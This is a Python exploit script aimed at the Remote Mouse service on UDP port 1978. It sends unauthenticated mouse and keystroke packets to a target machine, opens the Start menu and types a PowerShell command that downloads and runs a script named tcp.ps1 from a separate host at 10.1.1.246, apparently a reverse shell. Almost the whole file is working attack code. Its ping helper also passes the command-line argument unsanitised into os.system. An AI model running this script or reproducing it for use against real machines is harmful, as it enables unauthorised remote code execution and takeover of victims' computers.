#!/usr/bin/python3



from socket import socket, AF_INET, SOCK_STREAM, SOCK_DGRAM

from time import sleep

from sys import argv

import os



def Ping(ip):

    response = os.system("ping -c 1 -w 0 " + ip)

    sleep(2)

    

    if response == 0:

        return True

    else:

        return False

    return response





def MoveMouse(x,y,ip):

    def SendMouse(command,times,ip):

        for x in range(times):

            target = socket(AF_INET, SOCK_DGRAM)

            target.sendto(bytes(command,'ascii'),(ip,1978))

            sleep(0.001)

    if x>0:

        command="mos  5m 1 0"

        SendMouse(command,x,ip)

    elif x<0:

        x=x*-1

        command="mos  5m -1 0"

        SendMouse(command,x,ip)

    if y>0:

        command="mos  5m 0 1"

        SendMouse(command,y,ip)

    elif y<0:

        y=y*-1

        command="mos  6m 0 -1"

        SendMouse(command,y,ip)







def MousePress(command,ip,action="click"):

    if action=="down":

        target = socket(AF_INET, SOCK_DGRAM)

        target.sendto(bytes(command +" d",'ascii'),(ip,1978))

    elif action=="up":

        target = socket(AF_INET, SOCK_DGRAM)

        target.sendto(bytes(command +" u",'ascii'),(ip,1978))

    elif action=="click":

        target = socket(AF_INET, SOCK_DGRAM)

        target.sendto(bytes(command +" d",'ascii'),(ip,1978))

        target.sendto(bytes(command +" u",'ascii'),(ip,1978))

    else: raise Exception('MousePress: No action named "'+str(action)+'"')





def SendString(string,ip):

    for char in string:

        target = socket(AF_INET, SOCK_DGRAM)

        target.sendto(bytes(characters[char],'ascii'),(ip,1978))

        sleep(0.5)



    





class mouse:

    leftClick="mos  5R l"

    rightClick="mos  5R r"

    middleClick="mos  5R m"



characters={

    "A":"key  8[ras]116", "B":"key  8[ras]119", "C":"key  8[ras]118", "D":"key  8[ras]113", "E":"key  8[ras]112", 

    "F":"key  8[ras]115", "G":"key  8[ras]114", "H":"key  8[ras]125", "I":"key  8[ras]124", "J":"key  8[ras]127", 

    "K":"key  8[ras]126", "L":"key  8[ras]121", "M":"key  8[ras]120", "N":"key  8[ras]123", "O":"key  8[ras]122", 

    "P":"key  8[ras]101", "Q":"key  8[ras]100", "R":"key  8[ras]103", "S":"key  8[ras]102", "T":"key  7[ras]97", 

    "U":"key  7[ras]96", "V":"key  7[ras]99", "W":"key  7[ras]98", "X":"key  8[ras]109", "Y":"key  8[ras]108", 

    "Z":"key  8[ras]111",



    "a":"key  7[ras]84", "b":"key  7[ras]87", "c":"key  7[ras]86", "d":"key  7[ras]81", "e":"key  7[ras]80", 

    "f":"key  7[ras]83", "g":"key  7[ras]82", "h":"key  7[ras]93", "i":"key  7[ras]92", "j":"key  7[ras]95", 

    "k":"key  7[ras]94", "l":"key  7[ras]89", "m":"key  7[ras]88", "n":"key  7[ras]91", "o":"key  7[ras]90", 

    "p":"key  7[ras]69", "q":"key  7[ras]68", "r":"key  7[ras]71", "s":"key  7[ras]70", "t":"key  7[ras]65", 

    "u":"key  7[ras]64", "v":"key  7[ras]67", "w":"key  7[ras]66", "x":"key  7[ras]77", "y":"key  7[ras]76", 

    "z":"key  7[ras]79",



    "1":"key  6[ras]4", "2":"key  6[ras]7", "3":"key  6[ras]6", "4":"key  6[ras]1", "5":"key  6[ras]0",

    "6":"key  6[ras]3", "7":"key  6[ras]2", "8":"key  7[ras]13", "9":"key  7[ras]12", "0":"key  6[ras]5",



    "\n":"key  3RTN", "\b":"key  3BAS", " ":"key  7[ras]21",



    "+":"key  7[ras]30", "=":"key  6[ras]8", "/":"key  7[ras]26", "_":"key  8[ras]106", "<":"key  6[ras]9", 

    ">":"key  7[ras]11", "[":"key  8[ras]110", "]":"key  8[ras]104", "!":"key  7[ras]20", "@":"key  8[ras]117", 

    "#":"key  7[ras]22", "$":"key  7[ras]17", "%":"key  7[ras]16", "^":"key  8[ras]107", "&":"key  7[ras]19", 

    "*":"key  7[ras]31", "(":"key  7[ras]29", ")":"key  7[ras]28", "-":"key  7[ras]24", "'":"key  7[ras]18", 

    '"':"key  7[ras]23", ":":"key  7[ras]15", ";":"key  7[ras]14", "?":"key  7[ras]10", "`":"key  7[ras]85", 

    "~":"key  7[ras]75", "\\":"key  8[ras]105", "|":"key  7[ras]73", "{":"key  7[ras]78", "}":"key  7[ras]72",

    ",":"key  7[ras]25", ".":"key  7[ras]27"

}





def PopCalc(ip):

    MoveMouse(-5000,3000,ip)

    MousePress(mouse.leftClick,ip)

    sleep(1)

    #SendString("ping 10.1.1.246",ip)

    SendString("powershell IEX(New-Object Net.WebClient).DownloadString('http://10.1.1.246:9000/tcp.ps1')",ip)

    sleep(1)

    SendString("\n",ip)

    sleep(5)

    print("SUCCESS! exploit run on target",ip)





def main():

    try:

        targetIP=argv[1]    

    except:

        print("ERROR: You forgot to enter an IP! example: exploit.py 10.0.0.1")

        exit()

    if Ping(targetIP)==True:

        PopCalc(targetIP)

    else:

        print("Error Error Error")

    exit()



if __name__=="__main__":

    main()
